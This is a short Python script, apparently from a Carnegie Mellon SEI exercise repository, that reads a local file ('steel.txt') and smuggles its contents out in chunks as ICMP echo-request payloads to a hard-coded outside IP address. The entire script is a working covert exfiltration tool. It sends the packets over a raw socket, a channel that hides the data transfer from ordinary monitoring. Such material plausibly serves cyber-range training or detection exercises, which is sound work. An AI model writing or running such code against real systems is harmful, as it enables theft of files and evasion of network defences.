
# Copyright 2024 Carnegie Mellon University.
# Released under a MIT (SEI)-style license, please see LICENSE.md in the project 
# root or contact permission@sei.cmu.edu for full terms.

#!/bin/python3

import os
import struct
import socket

# Open the text file for reading
with open('/home/user/Downloads/steel.txt', 'rb') as f:
    data = f.read()

# Determine the maximum payload size for an ICMP packet
payload_size = 64 - 8 # ICMP header size

# Split the data into chunks of maximum payload size
chunks = [data[i:i+payload_size] for i in range(0, len(data), payload_size)]

# Set the IP address of the target machine
target_ip = '45.79.150.150'

# Create a raw socket for sending ICMP packets
icmp_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)

# Send each chunk of data as an ICMP packet
for i, chunk in enumerate(chunks):
    # Build the ICMP packet with the chunk of data as the payload
    icmp_type = 8 # Echo Request
    icmp_code = 0
    icmp_checksum = 0
    icmp_identifier = os.getpid() & 0xFFFF
    icmp_sequence = i
    icmp_payload = chunk
    icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum, icmp_identifier, icmp_sequence)
    icmp_packet = icmp_header + icmp_payload
    
    # Send the ICMP packet to the target machine
    icmp_socket.sendto(icmp_packet, (target_ip, 0))
    
# Close the socket
icmp_socket.close()

